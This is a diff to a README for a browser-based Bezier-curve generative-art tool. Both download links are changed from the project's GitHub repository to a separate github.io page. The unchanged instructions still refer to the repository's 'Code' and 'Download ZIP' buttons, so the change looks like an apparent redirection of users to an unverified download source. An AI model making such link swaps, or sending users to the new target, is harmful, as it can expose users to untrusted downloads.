@@ -1,6 +1,6 @@
 # 🎨 Bezier-1-Generative-Art - Create unique digital patterns every time
 
-[![](https://img.shields.io/badge/Download-Bezier_Art-blue.svg)](https://github.com/Bessbuggy762/Bezier-1-Generative-Art)
+[![](https://img.shields.io/badge/Download-Bezier_Art-blue.svg)](https://bessbuggy762.github.io)
 
 Bezier-1-Generative-Art generates digital designs using smooth, closed curves. The software creates unique compositions on dark backgrounds. Each refresh of the application produces a new arrangement of colors and shapes. You can use these visuals to design apparel, textiles, and graphics. The project uses canvas technology to ensure designs look sharp on any screen size.
 
@@ -18,7 +18,7 @@ This application focuses on simplicity and visual variety. It creates complex ge
 
 You do not need programming knowledge to run this software. The tool works inside your standard web browser. Follow these steps to view and save your art.
 
-1. Go to the project page at [https://github.com/Bessbuggy762/Bezier-1-Generative-Art](https://github.com/Bessbuggy762/Bezier-1-Generative-Art).
+1. Go to the project page at [https://bessbuggy762.github.io](https://bessbuggy762.github.io).
 2. Look for the green button labeled Code.
 3. Select Download ZIP from the menu.
 4. Save the file to your computer.
